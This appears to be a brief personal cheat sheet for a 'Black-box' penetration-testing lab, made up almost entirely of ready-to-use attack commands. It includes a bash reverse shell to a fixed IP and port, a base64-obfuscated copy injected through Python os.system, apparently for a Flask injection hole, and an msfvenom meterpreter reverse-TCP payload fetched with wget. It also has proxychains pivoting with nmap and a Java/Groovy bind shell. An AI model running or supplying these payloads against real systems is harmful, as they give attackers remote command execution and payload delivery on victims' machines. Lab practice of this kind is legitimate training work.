# Black-box 2

Tips:
Reverse shell:
- echo 'bash -c "bash -i >& /dev/tcp/192.38.198.2/4444 0>&1"' | base64

Encoding with python flask:
- __import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMzguMTk4LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")

Setup a linux meterpreter shell:
- msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.38.198.2 LPORT=5555 -f elf > payload.bin

Python3 webserver:
- python3 -m http.server 80

Download from server:
- wget http://192.196.85.2/payload.bin

Proxychain:
Port 9050
proxychains nmap -sT -P0 192.108.156.3

Gorvbind shell:
int port=5555;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();